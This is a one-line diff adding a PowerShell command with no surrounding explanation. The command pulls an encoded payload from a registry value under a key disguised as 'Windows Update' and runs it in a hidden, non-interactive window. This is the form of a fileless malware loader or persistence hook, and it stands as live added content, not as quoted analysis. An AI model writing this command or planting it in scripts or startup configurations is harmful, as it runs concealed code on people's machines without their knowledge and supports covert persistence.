@@ -1,0 +1,1 @@
+powershell.exe /NoP /NonI /c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell /NoP /NonI /W Hidden /enc $x
